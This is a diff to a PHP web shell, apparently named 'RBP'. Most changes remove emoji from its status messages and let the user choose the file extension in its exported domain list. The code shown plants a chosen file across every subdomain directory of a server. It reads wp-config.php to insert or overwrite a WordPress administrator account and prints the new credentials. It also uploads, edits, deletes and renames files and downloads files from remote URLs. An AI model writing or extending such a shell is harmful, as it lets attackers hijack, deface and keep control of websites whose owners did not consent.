@@ -133,12 +133,12 @@ function RBPmassDeploy($sourceFile, $baseDir) {
     $processed = 0;
     
     if (!file_exists($sourceFile)) {
-        return ["error" => "❌ Source file not found: $sourceFile"];
+        return ["error" => "Source file not found: $sourceFile"];
     }
     
     $fileContent = file_get_contents($sourceFile);
     if ($fileContent === false) {
-        return ["error" => "❌ Cannot read source file: $sourceFile"];
+        return ["error" => "Cannot read source file: $sourceFile"];
     }
     
     // Get the original filename
@@ -152,15 +152,15 @@ function RBPmassDeploy($sourceFile, $baseDir) {
         $targetDir = dirname($targetFile);
         if (!is_dir($targetDir)) {
             if (!mkdir($targetDir, 0755, true)) {
-                $results[] = "❌ [$processed/$total] Failed to create directory: " . $subdomain['name'];
+                $results[] = "[$processed/$total] Failed to create directory: " . $subdomain['name'];
                 continue;
             }
         }
         
         if (file_put_contents($targetFile, $fileContent)) {
-            $results[] = "✅ [$processed/$total] Deployed to: " . $subdomain['name'];
+            $results[] = "[$processed/$total] Deployed to: " . $subdomain['name'];
         } else {
-            $results[] = "❌ [$processed/$total] Failed: " . $subdomain['name'];
+            $results[] = "[$processed/$total] Failed: " . $subdomain['name'];
         }
     }
     
@@ -179,9 +179,9 @@ function RBPmassDelete($baseDir, $filename) {
         $targetFile = $subdomain['path'] . '/' . $filename;
         
         if (file_exists($targetFile) && unlink($targetFile)) {
-            $results[] = "✅ [$processed/$total] Deleted from: " . $subdomain['name'];
+            $results[] = "[$processed/$total] Deleted from: " . $subdomain['name'];
         } else {
-            $results[] = "❌ [$processed/$total] Not found: " . $subdomain['name'];
+            $results[] = "[$processed/$total] Not found: " . $subdomain['name'];
         }
     }
     
@@ -194,7 +194,11 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     $domainsList = [];
     
     foreach ($subdomains as $subdomain) {
-        $domainsList[] = $subdomain['url'] . '/' . $filename;
+        if (!empty($filename)) {
+            $domainsList[] = $subdomain['url'] . '/' . $filename;
+        } else {
+            $domainsList[] = $subdomain['url'];
+        }
     }
     
     return $domainsList;
@@ -230,7 +234,7 @@ function RBPeditWordPressUser() {
     }
     
     if (!$wpConfigPath || !file_exists($wpConfigPath)) {
-        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found! Searched from: $currentDir";
+        $result['error'] = "WordPress configuration file (wp-config.php) not found! Searched from: $currentDir";
         $result['current_dir'] = $currentDir;
         $result['searched_paths'] = "Searched up to: $searchDir";
         return $result;
@@ -390,7 +394,7 @@ require __DIR__ . '/wp-blog-header.php';";
     $table_prefix = parse_table_prefix($wpConfigPath);
 
     if (in_array(null, $db_constants, true)) {
-        $result['error'] = "❌ Could not parse WordPress database configuration from wp-config.php";
+        $result['error'] = "Could not parse WordPress database configuration from wp-config.php";
         return $result;
     }
 
@@ -402,7 +406,7 @@ require __DIR__ . '/wp-blog-header.php';";
     // Test database connection
     $mysqli = @new mysqli($db_host, $db_user, $db_password, $db_name);
     if ($mysqli->connect_error) {
-        $result['error'] = "❌ Database connection failed: " . $mysqli->connect_error;
+        $result['error'] = "Database connection failed: " . $mysqli->connect_error;
         return $result;
     }
 
@@ -422,7 +426,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
         $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to update existing user: " . $mysqli->error;
+            $result['error'] = "Failed to update existing user: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
@@ -441,7 +445,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $display_name  = $new_user_login;
         $stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to create new user: " . $mysqli->error;
+            $result['error'] = "Failed to create new user: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
@@ -456,7 +460,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
         $stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to set user capabilities: " . $mysqli->error;
+            $result['error'] = "Failed to set user capabilities: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
@@ -468,7 +472,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
         $stmt->bind_param('iss', $new_user_id, $level_key, $level_value);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to set user level: " . $mysqli->error;
+            $result['error'] = "Failed to set user level: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
@@ -506,7 +510,7 @@ require __DIR__ . '/wp-blog-header.php';";
     $host = $_SERVER['HTTP_HOST'];
     $loginUrl = $protocol . $host . '/wp-login.php';
     
-    $result['success'] = "✅ WordPress user " . $result['action'] . " successfully!";
+    $result['success'] = "WordPress user " . $result['action'] . " successfully!";
     $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
     $result['login_url'] = $loginUrl;
     $result['current_dir'] = $currentDir;
@@ -547,7 +551,8 @@ $isPostAction = false;
 if (isset($_GET['download'])) {
     header('Content-Type: text/plain');
     header('Content-Disposition: attachment; filename="domains.txt"');
-    $domainsList = RBPdownloadDomainsList($baseDir, 'rbp.html');
+    $extension = $_GET['extension'] ?? 'rbp.html';
+    $domainsList = RBPdownloadDomainsList($baseDir, $extension);
     foreach ($domainsList as $domain) {
         echo $domain . "\n";
     }
@@ -560,7 +565,7 @@ if (isset($_POST['mass_deploy'])) {
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
     if (empty($sourceFile) || !file_exists($sourceFile)) {
-        $_SESSION['mass_deploy_results'] = ["error" => "❌ Source file not found: $sourceFile"];
+        $_SESSION['mass_deploy_results'] = ["error" => "Source file not found: $sourceFile"];
         header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
         exit;
     }
@@ -615,9 +620,9 @@ if (isset($_POST['wget_url'])) {
         curl_close($ch);
         
         if ($httpCode === 200 && $fileContent !== false && file_put_contents($destination, $fileContent)) {
-            $_SESSION['wget_result'] = "✅ File downloaded successfully!";
+            $_SESSION['wget_result'] = "File downloaded successfully!";
         } else {
-            $_SESSION['wget_result'] = "❌ Download failed! HTTP Code: $httpCode";
+            $_SESSION['wget_result'] = "Download failed! HTTP Code: $httpCode";
         }
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
@@ -647,12 +652,12 @@ if (isset($_POST['download_adminer'])) {
     }
 
     if (file_exists('adminer.php')) {
-        $_SESSION['adminer_result'] = "ℹ️ Adminer is already downloaded!";
+        $_SESSION['adminer_result'] = "Adminer is already downloaded!";
     } else {
         if (RBPadminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
-            $_SESSION['adminer_result'] = "✅ Adminer downloaded successfully!";
+            $_SESSION['adminer_result'] = "Adminer downloaded successfully!";
         } else {
-            $_SESSION['adminer_result'] = "❌ Failed to download adminer.php";
+            $_SESSION['adminer_result'] = "Failed to download adminer.php";
         }
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
@@ -681,12 +686,12 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
         $tmpName = $_FILES['u']['tmp_name'];
         $destination = $currentDir . '/' . $fileName;
         if (move_uploaded_file($tmpName, $destination)) {
-            $_SESSION['upload_result'] = "✅ Upload successful!";
+            $_SESSION['upload_result'] = "Upload successful!";
         } else {
-            $_SESSION['upload_result'] = "❌ Upload failed!";
+            $_SESSION['upload_result'] = "Upload failed!";
         }
     } else {
-        $_SESSION['upload_result'] = "❌ Upload error: " . $_FILES['u']['error'];
+        $_SESSION['upload_result'] = "Upload error: " . $_FILES['u']['error'];
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
@@ -697,9 +702,9 @@ if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
     if (@unlink($filePath)) {
-        $_SESSION['delete_result'] = "✅ Delete successful";
+        $_SESSION['delete_result'] = "Delete successful";
     } else {
-        $_SESSION['delete_result'] = "❌ Delete failed";
+        $_SESSION['delete_result'] = "Delete failed";
     }
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
@@ -710,9 +715,9 @@ if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
     if (file_put_contents($filePath, $_POST['content'])) {
-        $_SESSION['save_result'] = "✅ Saved";
+        $_SESSION['save_result'] = "Saved";
     } else {
-        $_SESSION['save_result'] = "❌ Save failed";
+        $_SESSION['save_result'] = "Save failed";
     }
     $fileDir = dirname($filePath);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($fileDir));
@@ -725,9 +730,9 @@ if (isset($_POST['ren']) && isset($_POST['new'])) {
     $oldPath = base64_decode($_POST['ren']);
     $newPath = dirname($oldPath) . '/' . $_POST['new'];
     if (rename($oldPath, $newPath)) {
-        $_SESSION['rename_result'] = "✅ Renamed";
+        $_SESSION['rename_result'] = "Renamed";
     } else {
-        $_SESSION['rename_result'] = "❌ Rename failed";
+        $_SESSION['rename_result'] = "Rename failed";
     }
     $oldDir = dirname($oldPath);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($oldDir));
@@ -1324,7 +1329,10 @@ if (isset($_SESSION['adminer_result'])) {
         }
         
         function RBPdownloadDomains() {
-            window.open('?download=1', '_blank');
+            var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
+            if (extension !== null) {
+                window.open('?download=1&extension=' + encodeURIComponent(extension), '_blank');
+            }
         }
         
         function RBPsubmitWPEditUser() {
@@ -1388,7 +1396,7 @@ if (isset($_SESSION['adminer_result'])) {
                     echo '<p style="color: red;">' . htmlspecialchars($results['error']) . '</p>';
                 } else {
                     foreach ($results as $result) {
-                        $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
+                        $color = strpos($result, 'Deployed') !== false ? 'lime' : (strpos($result, 'Failed') !== false ? 'red' : 'yellow');
                         echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
                     }
                 }
@@ -1410,7 +1418,7 @@ if (isset($_SESSION['adminer_result'])) {
                 echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
                 
                 foreach ($results as $result) {
-                    $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
+                    $color = strpos($result, 'Deleted') !== false ? 'lime' : (strpos($result, 'Not found') !== false ? 'red' : 'yellow');
                     echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
                 }
                 
